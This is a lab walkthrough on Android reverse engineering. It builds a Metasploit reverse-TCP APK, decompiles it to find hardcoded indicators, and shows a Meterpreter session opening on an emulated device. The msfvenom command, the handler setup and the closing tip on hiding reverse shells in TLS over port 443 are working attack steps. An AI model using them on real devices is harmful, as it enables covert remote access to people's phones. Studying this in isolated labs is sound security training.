

# 📑 MOBILE SECURITY: REVERSE ENGINEERING & PENETRATION TESTING

**Date:** July 5, 2026

**Environment:** Isolated Virtual Lab (Kali Linux + Android Emulated Environment)

**Tools:** Metasploit Framework (`msfvenom`, `msfconsole`), `apktool`, `dex2jar`, JD-GUI / Bytecode Viewer

**Objective:** Statically analyze a mobile application binary, identify how payloads are embedded into Android components, and simulate a controlled post-exploitation payload execution phase.

## 🛠️ PREREQUISITES & ARCHITECTURE

Before executing the lab, ensure your workspace mirrors the following architecture:

```
                  [ Kali Linux (Attacker VM) ]
                   IP: 192.168.1.15 (Example)
                                │
        ┌───────────────────────┴───────────────────────┐
        ▼                                               ▼
┌──────────────────────────────┐                ┌──────────────────────────────┐
│  Static Analysis Workspace   │                │   Metasploit Multi-Handler   │
│  • apktool / dex2jar         │                │   • Exploit: multi/handler   │
│  • JD-GUI Visualizer         │                │   • Payload: android/meterp..│
└──────────────────────────────┘                └──────────────────────────────┘
                                │
                                ▼ (Isolated Host-Only Network)
               ┌──────────────────────────────────┐
               │   Android Emulated Target (AVD)  │
               │   IP: 192.168.1.50               │
               └──────────────────────────────────┘
```

## 🧪 STEP-BY-STEP LAB WALKTHROUGH

### 🔹 Step 1 — Payload Generation (`msfvenom`)

To analyze how a framework constructs an Android package (`.apk`), we first generate an un-obfuscated standalone test binary.

**Command:**

Bash

```
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.15 LPORT=4444 R > lab_target.apk
```

**Expected Output:**

Plaintext

```
[-] No platform was selected, defaulting to Android - Intentional Platform
[-] No arch selected, selecting dalvik from the payload
No encoder specified, outputting raw payload
Payload size: 10186 bytes
Saved as: lab_target.apk
```

### 🔹 Step 2 — Manifest & Resource Decompilation (`apktool`)

Before a binary can be run through a standard Java decompiler, its binary XML files (like `AndroidManifest.xml`) and resources must be decoded into human-readable formats.

**Command:**

Bash

```
apktool d lab_target.apk -o decompiled_apk/
```

**Expected Output:**

Plaintext

```
I: Using Apktool 2.x.x on lab_target.apk
I: Loading resource table...
I: Decoding AndroidManifest.xml with resources...
I: Loading resource table from file...
I: Regular decompiling resources...
I: Decoding values */* XMLs...
I: Baksmaliing classes.dex...
I: Copying assets and libs...
I: Copying unknown files...
I: Copying original files...
```

#### 🔍 Static Analysis Note: The Manifest File

Navigate into `decompiled_apk/` and open `AndroidManifest.xml`. Look closely at the requested permissions. An ethical hacker or malware analyst checks for over-privileged permissions:

XML

```
<uses-permission android:name="android.permission.INTERNET"/>
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
```

> **Key Finding:** Standard utility applications or simple games should not require extensive permissions like `READ_SMS` or `RECEIVE_BOOT_COMPLETED`. This is a classic indicator of compromise (IoC) during triage.

### 🔹 Step 3 — Source Code Extraction (`dex2jar`)

Android applications compile Java/Kotlin code into Dalvik Executable (`.dex`) format. To perform code reverse engineering, extract these files and convert them back into standard Java class archives (`.jar`).

**Command:**

Bash

```
# Extract the classes.dex from the raw zip structure of the APK
unzip lab_target.apk classes.dex -d /tmp/

# Convert the DEX bytecode to Java bytecode
d2j-dex2jar /tmp/classes.dex -o lab_classes.jar
```

**Expected Output:**

Plaintext

```
dex2jar /tmp/classes.dex -> ./lab_classes.jar
```

### 🔹 Step 4 — Code Reverse Engineering & Analysis (JD-GUI)

Launch your graphical decompiler to inspect the structural logic of the payload package.

**Command:**

Bash

```
jd-gui lab_classes.jar &
```

**Analysis Walkthrough (What to Look For):**

1. In the left-hand navigation pane, expand the package tree.
    
2. Locate the package prefix: `com.metasploit.stage`.
    
3. Open `Payload.class`.
    

Java

```
// Conceptual output of the reversed Java bytecode within JD-GUI
package com.metasploit.stage;

import android.content.Context;
import java.io.DataInputStream;
import java.net.Socket;

public class Payload {
    public static String LHOST = "192.168.1.15"; // Statically embedded C2 configuration
    public static String LPORT = "4444";

    public static void run(Context context) {
        // Core execution sequence establishing the socket connection
        try {
            Socket socket = new Socket(LHOST, Integer.parseInt(LPORT));
            // Further payload staging logic...
        } catch (Exception e) {}
    }
}
```

> **Obsidian Note:** Notice that the hardcoded configuration matches your `msfvenom` parameters exactly. This pattern is exactly what network signatures and host-based YARA rules look for.

### 🔹 Step 5 — Initialize Multi-Handler C2 Framework (`msfconsole`)

With the structural analysis complete, configure the listening post (Command & Control simulation) to receive the session link.

**Command:**

Bash

```
msfconsole
```

**Expected Output:**

Plaintext

```
      .:okOOOkx:.                              .:okOOOkx:.
    .xOOOOOOOOOOOx.                          .xOOOOOOOOOOOx.
   .OOOOOOOOOOOOOOO.                        .OOOOOOOOOOOOOOO.
   dOOOOOOOOOOOOOOOp                        dOOOOOOOOOOOOOOOp

       -[ metasploit v6.x.x-dev                            ]
+ -- --=[ 2200+ exploits - 1150+ auxiliary - 400+ payloads ]
+ -- --=[ 610+ posts - 45+ encoders - 11+ nops             ]

msf6 > 
```

#### Configuring Workspace and Variables

Execute the following step-by-step to load your configuration module:

Plaintext

```
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set PAYLOAD android/meterpreter/reverse_tcp
PAYLOAD => android/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.1.15
LHOST => 192.168.1.15
msf6 exploit(multi/handler) > set LPORT 4444
LPORT => 4444
msf6 exploit(multi/handler) > show options
```

**Expected Verification Matrix Table:**

|**Name**|**Current Setting**|**Required**|**Description**|
|---|---|---|---|
|**LHOST**|192.168.1.15|yes|The listen address|
|**LPORT**|4444|yes|The listen port|

### 🔹 Step 6 — Execution & Post-Exploitation Analysis

Run the handler. When the application is launched within your isolated testing device, the execution loop identified in **Step 4** connects back to the framework.

**Command:**

Plaintext

```
msf6 exploit(multi/handler) > exploit
```

**Expected Output:**

Plaintext

```
[*] Started reverse TCP handler on 192.168.1.15:4444 
[*] Sending stage (10186 bytes) to 192.168.1.50
[*] Meterpreter session 1 opened (192.168.1.15:4444 -> 192.168.1.50:52341)

meterpreter > sysinfo
Computer    : localhost
OS          : Android 14 - Linux 6.1.x (armv8l)
Meterpreter : java/android
meterpreter > getuid
Server username: u0_a142
```

## 🧠 CORE UNDERSTANDING & BLUEPRINT SYNC

```
[Phase: Recon/Gen] ──► [Phase: Static Decompilation] ──► [Phase: Code Audit] ──► [Phase: C2 Validation]
    msfvenom               apktool / dex2jar               JD-GUI             msfconsole/Meterpreter
```

- **The Framework Level:** Metasploit functions cleanly because it handles both ends of the lifecycle—compiling matching architectural stubs (`dalvik` bytecode) and spinning up network sockets that wait precisely for those stubs to return.
    
- **The Code Connection:** The reverse engineering phase exposes the structural blueprint. What the attacker compiles, the defender can systematically unpack with `apktool` and `dex2jar` to find indicators of compromise (like hardcoded IP addresses/ports).
    
- **Privilege Realization:** Notice that running `getuid` yields `u0_a142`. This proves that on modern Android architectures, the payload is severely restricted inside its own sandbox application user account, unless explicit local exploits or privilege escalations are applied.
    

## ⚠️ ENGINEERING LESSONS LEARNED & DEFENSIVE NOTE

- **Code Obfuscation:** Standard payloads compiled via tools without explicit ProGuard or DexGuard compilation routines leave class structures exposed perfectly to tools like `dex2jar`. Production systems must utilize structural layout and control-flow flattening obfuscation.
    
- **Signature Prevention:** Network monitors looking at cleartext staging connections can instantly drop packets targeting known Metasploit stubs. Secure environments rely on custom-compiled reverse TLS shells over port 443 to blend into normal encrypted traffic profiles.